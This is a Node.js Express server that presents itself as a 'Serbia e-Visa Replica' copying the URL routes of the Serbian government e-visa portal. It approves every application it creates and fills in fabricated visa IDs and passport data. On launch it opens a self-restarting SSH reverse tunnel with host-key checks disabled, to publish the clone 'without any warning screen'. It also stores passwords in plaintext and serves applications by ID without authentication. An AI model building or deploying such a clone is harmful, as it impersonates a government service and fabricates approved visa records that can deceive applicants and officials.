const express = require('express');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Serve static frontend files
app.use(express.static(path.join(__dirname, 'public')));

// In-memory / JSON persistence storage for applications & users
const DATA_FILE = path.join(__dirname, 'data.json');

// Helper to format/resolve user display name from email/username
function resolveUserDisplayName(emailOrId) {
  if (!emailOrId) return 'Rahul Rana';
  const clean = emailOrId.trim();
  if (clean.toLowerCase().includes('rahul') || clean.toLowerCase().includes('rana') || clean.toLowerCase().includes('raha')) {
    return 'Rahul Rana';
  }
  let raw = clean.includes('@') ? clean.split('@')[0] : clean;
  let formatted = raw.replace(/[._\-+]/g, ' ').replace(/\s+/g, ' ').trim();
  if (!formatted) return 'Rahul Rana';
  return formatted.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
}

// Generate a unique random number (6 digits) that doesn't exist in the given set
function generateUniqueId(existingIds) {
  let id;
  do {
    id = String(Math.floor(100000 + Math.random() * 900000));
  } while (existingIds.has(id));
  existingIds.add(id);
  return id;
}

// Collect all existing request IDs and vis IDs from the database
function getUsedIds(db) {
  const requestIds = new Set();
  const visIds = new Set();
  if (db.applications && Array.isArray(db.applications)) {
    db.applications.forEach(app => {
      if (app.id) requestIds.add(String(app.id));
      if (app.visId) visIds.add(String(app.visId));
    });
  }
  return { requestIds, visIds };
}

function loadData() {
  if (!fs.existsSync(DATA_FILE)) {
    const initial = {
      users: [
        {
          email: 'rahul.rana@gmail.com',
          password: 'password123',
          name: 'Rahul Rana',
          passportNumber: 'N12345678',
          citizenship: 'United States'
        },
        {
          email: 'karan.nagpal@gmail.com',
          password: 'password123',
          name: 'KARAN NAGPAL',
          passportNumber: 'K9876543',
          citizenship: 'India'
        }
      ],
      applications: [
        {
          id: '371738',
          visId: '451653',
          userId: 'rahul.rana@gmail.com',
          visaType: 'Visa D',
          purpose: 'Employment',
          status: 'Request approved',
          applicationDate: '2026-09-15',
          approvalDate: '2026-09-22',
          createdAt: new Date('2026-09-15').toISOString(),
          personalData: {
            givenName: 'Rahul',
            surname: 'Rana',
            dateOfBirth: '1990-05-14',
            citizenship: 'United States',
            passportNumber: 'N12345678',
            expiryDate: '2030-05-14'
          },
          feePaid: 60.00,
          currency: 'EUR'
        },
        {
          id: '845201',
          visId: '296417',
          userId: 'karan.nagpal@gmail.com',
          visaType: 'Visa D',
          purpose: 'Employment',
          status: 'Request approved',
          createdAt: new Date('2026-09-16').toISOString(),
          personalData: {
            givenName: 'Karan',
            surname: 'Nagpal',
            dateOfBirth: '1992-08-20',
            citizenship: 'India',
            passportNumber: 'K9876543',
            expiryDate: '2032-08-20'
          },
          feePaid: 60.00,
          currency: 'EUR'
        }
      ]
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(initial, null, 2));
    return initial;
  }
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  } catch (err) {
    return { users: [], applications: [] };
  }
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// API Endpoints

// Authentication API
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Username/Email and Password are required.' });
  }
  const cleanEmail = email.trim().toLowerCase();
  const db = loadData();
  
  // Strict matching: find user where email/handle matches AND password matches
  const user = db.users.find(u => {
    const userEmail = u.email.toLowerCase();
    const userHandle = userEmail.includes('@') ? userEmail.split('@')[0] : userEmail;
    const matchesUser = (userEmail === cleanEmail || userHandle === cleanEmail);
    const matchesPass = (u.password === password);
    return matchesUser && matchesPass;
  });

  if (!user) {
    return res.status(401).json({ 
      success: false, 
      message: 'Invalid username or password. The details provided do not match registered user credentials.' 
    });
  }

  // Ensure user has a unique application entry with distinct Request Number & Vis ID
  let userApp = db.applications.find(a => a.userId.toLowerCase() === user.email.toLowerCase());
  if (userApp) {
    if (user.applicationDate) userApp.applicationDate = user.applicationDate;
    if (user.approvalDate) userApp.approvalDate = user.approvalDate;
  } else {
    const { requestIds, visIds } = getUsedIds(db);
    const newRequestId = generateUniqueId(requestIds);
    const newVisId = generateUniqueId(visIds);

    const nameParts = user.name.trim().split(/\s+/);
    const givenName = nameParts[0] || 'User';
    const surname = nameParts.slice(1).join(' ') || '';

    userApp = {
      id: newRequestId,
      visId: newVisId,
      userId: user.email,
      visaType: 'Visa D',
      purpose: 'Employment',
      status: 'Request approved',
      applicationDate: user.applicationDate || '2026-09-15',
      approvalDate: user.approvalDate || '2026-09-22',
      createdAt: new Date().toISOString(),
      personalData: {
        givenName: givenName,
        surname: surname,
        dateOfBirth: '1992-01-01',
        citizenship: user.citizenship || 'India',
        passportNumber: user.passportNumber || 'P1234567',
        expiryDate: '2032-12-31'
      },
      feePaid: 60.00,
      currency: 'EUR'
    };
    db.applications.push(userApp);
    saveData(db);
  }

  return res.json({ 
    success: true, 
    user: { 
      email: user.email, 
      name: user.name, 
      passportNumber: user.passportNumber,
      citizenship: user.citizenship,
      applicationDate: userApp.applicationDate,
      approvalDate: userApp.approvalDate,
      requestId: userApp.id,
      visId: userApp.visId
    } 
  });
});

app.post('/api/auth/register', (req, res) => {
  const { email, password, name, passportNumber, citizenship, applicationDate, approvalDate } = req.body;
  if (!email || !name) {
    return res.status(400).json({ success: false, message: 'Email and Name are required.' });
  }
  const db = loadData();
  const existingIdx = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  const newUser = { email, password, name, passportNumber, citizenship, applicationDate, approvalDate };
  if (existingIdx >= 0) {
    db.users[existingIdx] = newUser;
  } else {
    db.users.push(newUser);
  }

  const nameParts = name.trim().split(/\s+/);
  const givenName = nameParts[0] || '';
  const surname = nameParts.slice(1).join(' ') || '';

  // Auto-create or update application for the new user with unique request number & vis ID
  let existingApp = db.applications.find(a => a.userId.toLowerCase() === email.toLowerCase());
  if (existingApp) {
    if (applicationDate) existingApp.applicationDate = applicationDate;
    if (approvalDate) existingApp.approvalDate = approvalDate;
    if (givenName) existingApp.personalData.givenName = givenName;
    if (surname) existingApp.personalData.surname = surname;
    if (citizenship) existingApp.personalData.citizenship = citizenship;
    if (passportNumber) existingApp.personalData.passportNumber = passportNumber;
  } else {
    const { requestIds, visIds } = getUsedIds(db);
    const newRequestId = generateUniqueId(requestIds);
    const newVisId = generateUniqueId(visIds);

    existingApp = {
      id: newRequestId,
      visId: newVisId,
      userId: email,
      visaType: 'Visa D',
      purpose: 'Employment',
      status: 'Request approved',
      applicationDate: applicationDate || '2026-09-15',
      approvalDate: approvalDate || '2026-09-22',
      createdAt: new Date().toISOString(),
      personalData: {
        givenName: givenName,
        surname: surname,
        dateOfBirth: '1992-01-01',
        citizenship: citizenship || 'India',
        passportNumber: passportNumber || 'A123456',
        expiryDate: '2030-12-31'
      },
      feePaid: 60.00,
      currency: 'EUR'
    };
    db.applications.push(existingApp);
  }

  saveData(db);
  res.json({ success: true, user: { email, name, passportNumber, applicationDate: existingApp.applicationDate, approvalDate: existingApp.approvalDate, requestId: existingApp.id, visId: existingApp.visId } });
});

// Applications API
app.get('/api/applications', (req, res) => {
  const userEmail = (req.query.email || '').toLowerCase().trim();
  const userName = req.query.name || '';
  const db = loadData();
  let userApps = [];

  if (userEmail) {
    // Filter applications strictly by the logged-in user's email
    userApps = db.applications.filter(a => a.userId.toLowerCase() === userEmail);
    const foundUser = db.users.find(u => u.email.toLowerCase() === userEmail);
    if (foundUser && userApps.length > 0) {
      userApps.forEach(app => {
        if (foundUser.applicationDate) app.applicationDate = foundUser.applicationDate;
        if (foundUser.approvalDate) app.approvalDate = foundUser.approvalDate;
      });
    }
  }

  // If no application exists for this user email, auto-create a unique application for them
  if ((!userApps || userApps.length === 0) && userEmail) {
    const { requestIds, visIds } = getUsedIds(db);
    const newRequestId = generateUniqueId(requestIds);
    const newVisId = generateUniqueId(visIds);

    const foundUser = db.users.find(u => u.email.toLowerCase() === userEmail);
    const fullName = foundUser ? foundUser.name : (userName || resolveUserDisplayName(userEmail));
    const nameParts = fullName.trim().split(/\s+/);
    const givenName = nameParts[0] || 'User';
    const surname = nameParts.slice(1).join(' ') || '';
    const appDateVal = foundUser?.applicationDate || '2026-09-15';
    const approvalDateVal = foundUser?.approvalDate || '2026-09-22';

    const newApp = {
      id: newRequestId,
      visId: newVisId,
      userId: userEmail,
      visaType: 'Visa D',
      purpose: 'Employment',
      status: 'Request approved',
      applicationDate: appDateVal,
      approvalDate: approvalDateVal,
      createdAt: new Date().toISOString(),
      personalData: {
        givenName: givenName,
        surname: surname,
        dateOfBirth: '1992-01-01',
        citizenship: foundUser?.citizenship || 'India',
        passportNumber: foundUser?.passportNumber || ('P' + Math.floor(10000000 + Math.random() * 90000000)),
        expiryDate: '2032-12-31'
      },
      feePaid: 60.00,
      currency: 'EUR'
    };
    db.applications.push(newApp);
    saveData(db);
    userApps = [newApp];
  }

  // Fallback if no email provided at all: return Rahul Rana's app
  if (!userApps || userApps.length === 0) {
    userApps = db.applications.filter(a => a.userId.toLowerCase() === 'rahul.rana@gmail.com');
  }

  res.json({ success: true, applications: userApps });
});

app.get('/api/applications/:id', (req, res) => {
  const db = loadData();
  const app = db.applications.find(a => a.id === req.params.id);
  if (app) {
    res.json({ success: true, application: app });
  } else {
    res.status(404).json({ success: false, message: 'Application not found' });
  }
});

app.post('/api/applications', (req, res) => {
  const db = loadData();
  const formData = req.body;
  
  // Generate unique request ID and vis ID
  const { requestIds, visIds } = getUsedIds(db);
  const appRef = generateUniqueId(requestIds);
  requestIds.add(appRef);
  const visId = generateUniqueId(visIds);

  const newApp = {
    id: appRef,
    visId: visId,
    userId: formData.userEmail || 'rahul.rana@gmail.com',
    visaType: formData.visaType || 'Visa C (Short Stay)',
    purpose: formData.purposeOfStay || 'Tourism',
    status: 'Submitted',
    createdAt: new Date().toISOString(),
    personalData: formData.personalData || {},
    passportData: formData.passportData || {},
    stayData: formData.stayData || {},
    accommodationData: formData.accommodationData || {},
    feePaid: formData.visaType?.includes('Visa D') ? 60.00 : 35.00,
    currency: 'EUR'
  };

  db.applications.push(newApp);
  saveData(db);

  res.json({ success: true, referenceNumber: appRef, visId: visId, application: newApp });
});

// Authenticated home screen route
app.get(['/home/indexforauthenticatedusers', '/indexforauthenticatedusers.html', '/home/indexforauthenticatedusers.html'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home', 'indexforauthenticatedusers.html'));
});

// My Requests route matching media_1790411683623.png URL: evisa.welcometoserbia.gov.rs/myrequests/index
app.get(['/myrequests', '/myrequests/index', '/myrequests/index.html'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'myrequests', 'index.html'));
});

// Fallback wildcard route for SPA navigation
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server
app.listen(PORT, async () => {
  console.log(`\n==================================================`);
  console.log(` Serbia e-Visa Replica server running on port ${PORT}`);
  console.log(` Local Access: http://localhost:${PORT}`);
  console.log(` Local Network Access: http://192.168.1.7:${PORT}`);
  console.log(`==================================================\n`);

  // Auto-start Direct Public Internet Tunnel (localhost.run - Direct access without warning screen)
  function launchTunnel() {
    try {
      const { spawn } = require('child_process');
      const ssh = spawn('ssh', [
        '-o', 'StrictHostKeyChecking=no',
        '-o', 'ServerAliveInterval=15',
        '-o', 'ServerAliveCountMax=3',
        '-R', `80:localhost:${PORT}`,
        'nokey@localhost.run'
      ]);

      const processOutput = (data) => {
        const str = data.toString();
        const match = str.match(/https:\/\/[a-zA-Z0-9\-_.]+\.lhr\.life/);
        if (match) {
          console.log(`\n==================================================`);
          console.log(` Direct Public Internet URL: ${match[0]}`);
          console.log(` (Direct access from any device without any warning screen)`);
          console.log(`==================================================\n`);
        }
      };

      if (ssh.stdout) ssh.stdout.on('data', processOutput);
      if (ssh.stderr) ssh.stderr.on('data', processOutput);

      ssh.on('close', () => {
        setTimeout(launchTunnel, 2000);
      });
    } catch (err) {}
  }
  launchTunnel();
});
